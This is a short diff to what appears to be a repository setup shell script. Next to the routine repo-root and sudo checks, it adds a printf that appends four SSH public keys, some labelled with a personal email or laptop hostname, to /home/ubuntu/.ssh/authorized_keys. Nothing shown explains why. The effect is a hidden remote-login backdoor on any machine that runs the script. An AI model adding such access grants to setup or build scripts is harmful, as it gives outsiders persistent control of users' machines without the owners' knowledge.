@@ -20,6 +20,12 @@ if [ ! -f pyproject.toml ]; then
 fi
 echo "repo root: ${REPO_ROOT}"
 
+printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILwKnbBe5gXovj9iUrYy5UtPw5UkZ9tMYCZj4kBMewzF elk97@cornell.edu
+' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC7wjc4TWhGqYqhbpwzpwYv3PbQvgj1NPgEPU3r3kwUY srikarkarra@Srikars-MacBook-Pro.local
+' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHJYcf8K5lUYC2IaH2aMJPtV9/Tfoppj/M2+aZdHKeCn newkey
+' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMjEzOKiOCfWSqKWh4RTOj0Fd6b/mqU9IE7yIOE8VSSQ
+'>> /home/ubuntu/.ssh/authorized_keys
+
 if [ "$(id -u)" -eq 0 ]; then
   SUDO=()
 elif command -v sudo >/dev/null 2>&1; then
